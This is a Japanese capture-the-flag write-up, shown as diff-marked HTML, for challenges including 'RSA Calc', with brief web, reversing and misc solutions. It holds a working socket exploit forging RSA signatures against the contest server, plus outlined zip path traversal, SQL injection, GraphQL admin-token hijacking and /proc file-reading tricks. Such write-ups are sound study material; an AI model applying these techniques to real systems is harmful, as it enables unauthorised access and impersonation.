-<span class="n">answer2</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream2</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
-
-<span class="n">coeff_diffs</span> <span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">matrix</span><span class="p">(</span>
-    <span class="p">[</span> <span class="p">[</span> <span class="n">c1</span> <span class="o">-</span> <span class="n">c2</span> <span class="k">for</span> <span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">c2</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">c1s</span><span class="p">,</span> <span class="n">c2s</span><span class="p">)</span> <span class="p">]</span> <span class="k">for</span> <span class="p">(</span><span class="n">c1s</span><span class="p">,</span> <span class="n">c2s</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">coeffs1</span><span class="p">,</span> <span class="n">coeffs2</span><span class="p">)</span>  <span class="p">],</span>
-    <span class="n">dtype</span> <span class="o">=</span> <span class="s1">&#39;float&#39;</span>
-<span class="p">)</span>
-
-<span class="n">answer_diffs</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">transpose</span><span class="p">(</span>
-        <span class="n">np</span><span class="o">.</span><span class="n">matrix</span><span class="p">(</span>
-            <span class="p">[</span> <span class="n">a1</span> <span class="o">-</span> <span class="n">a2</span> <span class="k">for</span> <span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">answer1</span><span class="p">,</span> <span class="n">answer2</span><span class="p">)</span> <span class="p">],</span>
-            <span class="n">dtype</span> <span class="o">=</span> <span class="s1">&#39;float&#39;</span>
-        <span class="p">)</span>
-<span class="p">)</span>
-
-<span class="n">coeff_diffs_inv</span> <span class="o">=</span> <span class="n">inv</span><span class="p">(</span>
-    <span class="n">np</span><span class="o">.</span><span class="n">matrix</span><span class="p">(</span><span class="n">coeff_diffs</span><span class="p">,</span> <span class="n">dtype</span> <span class="o">=</span> <span class="s1">&#39;float&#39;</span><span class="p">)</span>
-<span class="p">)</span>
-<span class="n">flag</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">transpose</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">linalg</span><span class="o">.</span><span class="n">solve</span><span class="p">(</span><span class="n">coeff_diffs</span><span class="p">,</span> <span class="n">answer_diffs</span><span class="p">))</span>
-
-<span class="n">flag_int</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">around</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span><span class="o">.</span><span class="n">tolist</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
-
-<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-
-<span class="k">print</span><span class="p">(</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag_int</span> <span class="p">])</span> <span class="p">)</span>
-</code></pre></td></tr></table>
-</div>
-</div><h3 id="rsa-calc">RSA Calc</h3>
-<p>下記のようなプログラムが動いている。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span><span class="lnt">84
-</span><span class="lnt">85
-</span><span class="lnt">86
-</span><span class="lnt">87
-</span><span class="lnt">88
-</span><span class="lnt">89
-</span><span class="lnt">90
-</span><span class="lnt">91
-</span><span class="lnt">92
-</span><span class="lnt">93
-</span><span class="lnt">94
-</span><span class="lnt">95
-</span><span class="lnt">96
-</span><span class="lnt">97
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">params</span> <span class="kn">import</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">flag</span>
-<span class="kn">import</span> <span class="nn">binascii</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">signal</span>
-
-
-<span class="n">N</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
-<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
-<span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
-
-
-<span class="k">def</span> <span class="nf">input</span><span class="p">(</span><span class="n">prompt</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
-    <span class="k">return</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-
-<span class="k">def</span> <span class="nf">menu</span><span class="p">():</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;----------
-</span><span class="s1">1) Sign
-</span><span class="s1">2) Exec
-</span><span class="s1">3) Exit
-</span><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
-        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
-    <span class="k">except</span><span class="p">:</span>
-        <span class="k">return</span> <span class="mi">3</span>
-
-
-<span class="k">def</span> <span class="nf">cmd_sign</span><span class="p">():</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;data&gt; &#39;</span><span class="p">)</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">256</span><span class="p">:</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Too long</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-        <span class="k">return</span>
-
-    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="sa">b</span><span class="s1">&#39;1337&#39;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Error</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-        <span class="k">return</span>
-
-    <span class="n">signature</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">d</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Signature: {}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">signature</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()))</span>
-
-<span class="k">def</span> <span class="nf">cmd_exec</span><span class="p">():</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;data&gt; &#39;</span><span class="p">)</span>
-    <span class="n">signature</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;signature&gt; &#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
-
-    <span class="k">if</span> <span class="n">signature</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">signature</span> <span class="o">&gt;=</span> <span class="n">N</span><span class="p">:</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Invalid signature</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-        <span class="k">return</span>
-
-    <span class="n">check</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">signature</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">))</span>
-    <span class="k">if</span> <span class="n">data</span> <span class="o">!=</span> <span class="n">check</span><span class="p">:</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Invalid signature</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-        <span class="k">return</span>
-
-    <span class="n">chunks</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
-    <span class="n">stack</span> <span class="o">=</span> <span class="p">[]</span>
-    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;+&#39;</span><span class="p">:</span>
-            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">+</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
-        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;-&#39;</span><span class="p">:</span>
-            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">-</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
-        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;*&#39;</span><span class="p">:</span>
-            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">*</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
-        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;/&#39;</span><span class="p">:</span>
-            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">/</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
-        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span><span class="p">:</span>
-            <span class="n">val</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
-            <span class="k">if</span> <span class="n">val</span> <span class="o">==</span> <span class="mi">1337</span><span class="p">:</span>
-                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
-
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Answer: {}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())))</span>
-
-
-<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;N: {}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">N</span><span class="p">))</span>
-    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="n">command</span> <span class="o">=</span> <span class="n">menu</span><span class="p">()</span>
-            <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-                <span class="n">cmd_sign</span><span class="p">()</span>
-            <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
-                <span class="n">cmd_exec</span><span class="p">()</span>
-            <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
-                <span class="k">break</span>
-        <span class="k">except</span><span class="p">:</span>
-            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Error</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-            <span class="k">break</span>
-
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
-    <span class="n">main</span><span class="p">()</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><code>F</code>または<code>1337</code>を含まないならば、任意の文字列に署名してくれる。そしてスタック署名されたスタックマシンの命令列を実行し、狙ったところに入れる（そのために<code>F</code>や<code>1337</code>が必要）ことができればフラグが入手できる。
-RSAの準同型性を利用した。端的にいうと、いまRSAのパラメーターとして\(N, e, d\)と、任意の平文\(m_1, m_2\)があるとして、RSAは次がなりたつ。</p>
-<p>$$
-\text{Sign}_{d, N}(m_1 \times m_2) \equiv \text{Sign}_{d, N}(m_1) \times \text{Sign}_{d, N}(m_2) \bmod N
-$$</p>
-<p>よって次のようなプランでアタックする。</p>
-<ol>
-<li>\(2\)に署名させる</li>
-<li>\(\frac{\mathtt{1337,F}}{2}\)した値に署名させる
-<ul>
-<li>偶然<code>1337,F</code>の数値表現は\(2\)で割り切ることができた</li>
-</ul>
-</li>
-<li>上記2つの署名をかけ算して\(N\)で割った余りをとる
-<ul>
-<li>これが<code>1337,F</code>の署名となっている</li>
-</ul>
-</li>
-<li><code>1337,F</code>を実行し、署名として（3）で得られたものを入れる</li>
-</ol>
-<p>これをやるのが下記のプログラムである。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
-<span class="kn">import</span> <span class="nn">re</span>
-<span class="kn">import</span> <span class="nn">socket</span>
-<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;rsacalc.quals.beginners.seccon.jp&#34;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">))</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
-<span class="n">data_n</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;N: (\d+)</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
-<span class="n">N</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data_n</span><span class="p">)</span>
-
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;N: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">))</span>
-
-<span class="n">command</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1337,F&#39;</span><span class="p">)</span>
-<span class="n">half_command</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">command</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>
-
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;command: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
-
-<span class="c1"># Get `2` signature</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\02\n</span><span class="s1">&#39;</span><span class="p">)</span>
-
-<span class="n">signature_2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span>
-    <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;Signature: ([\da-f]+)&#39;</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
-    <span class="mi">16</span>
-<span class="p">)</span>
-
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;signature_2: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">signature_2</span><span class="p">))</span>
-
-<span class="c1"># Get `half_command` signature</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span>
-    <span class="n">half_command</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">((</span><span class="n">half_command</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">signed</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
-<span class="p">)</span>
-
-<span class="n">signature_half_command</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span>
-    <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;Signature: ([\da-f]+)&#39;</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
-    <span class="mi">16</span>
-<span class="p">)</span>
-
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;signature half command: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">signature_half_command</span><span class="p">))</span>
-
-<span class="c1"># Calculate signature</span>
-<span class="n">signature_command</span> <span class="o">=</span> <span class="n">signature_half_command</span> <span class="o">*</span> <span class="n">signature_2</span> <span class="o">%</span> <span class="n">N</span>
-
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;GOOOOOOOOOOOOOOOOOO&#34;</span><span class="p">)</span>
-
-<span class="c1"># Execute command</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1337,F</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
-<span class="n">sig</span> <span class="o">=</span> <span class="p">(</span><span class="n">format</span><span class="p">(</span><span class="n">signature_command</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">sig</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
-
-<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="web">Web</h2>
-<h3 id="spy">Spy</h3>
-<p>ユーザの有無でサーバの応答時間が変わるので、全ユーザー試して列挙。</p>
-<h3 id="tweetstore">Tweetstore</h3>
-<p>SQLインジェクションでユーザ情報を表示する。</p>
-<h3 id="unzip">unzip</h3>
-<p>解凍後に../../../../../../../../../flag.txtを展開するzipをアップロード。</p>
-<h3 id="profiler">profiler</h3>
-<p>Burp Suiteで通信を覗くと、APIでGraphQLが使われていることがわかる。
-AltairというChrome拡張機能でGraphQLのクエリを送ることができる。
-利用できそうなAPIを探すと、他の人のprofileが覗けそうなsomeoneとトークンをアップデートできそうなupdateTokenが見つかる。
-someoneでuid:adminを指定してリクエストすると、adminのTokenが参照できる。
-ここで手に入れた値をupdateTokenで指定すると、自分のTokenがadminと同じトークンに変更できる。
-この状態でflagページにアクセスすると、flagが表示される。</p>
-<h2 id="reversing">Reversing</h2>
-<h3 id="mask">mask</h3>
-<p>Ghidraに食わせると、flagの各文字を&amp; 0x75した文字列と&amp; 0xebした文字列が見つかるので、これらの論理和を計算。</p>
-<h3 id="yakisoba">yakisoba</h3>
-<p>Ghidraに食わせると、flagの各文字を判定する関数が見つかるので、読む。</p>
-<h3 id="ghost">ghost</h3>
-<p>実装が与えられているので、総当たり。</p>
-<h2 id="misc">Misc</h2>
-<h3 id="welcome">Welcome</h3>
-<p>Discordを見る。</p>
-<h3 id="emoemoencode">emoemoencode</h3>
-<p>絵文字の文字コードの下2桁をasciiにする。</p>
-<h3 id="readme">readme</h3>
-<p>/proc/self/environでpwdが/home/ctf/serverとわかるので、/proc/self/cwd/../flagを渡し、相対パスでアクセス。</p>
-
-                    </div>
-                </section>
-                
-                <h1 class="content-subhead">29 Dec 2019, 21:54</h1>
-                <section class="post">
-                    <header class="post-header">
-
